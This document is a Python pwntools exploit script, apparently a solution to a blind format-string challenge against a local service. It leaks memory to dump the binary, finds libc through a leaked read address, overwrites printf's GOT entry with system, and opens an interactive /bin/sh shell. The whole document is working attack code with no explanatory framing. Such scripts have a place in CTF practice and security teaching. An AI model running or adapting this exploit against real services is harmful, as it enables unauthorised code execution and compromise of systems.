#coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 说明有\n，出现新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None


def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()


#getbinary()
read_got = 0x601020
printf_got = 0x601018
sh = remote(ip, port)

# let the read get resolved
sh.sendline('a')
sh.recv()
# get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
sh.recv()
read_addr = u64(data)

# get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
# modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
# get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()

# get shell
sh.sendline('/bin/sh;')
sh.interactive()
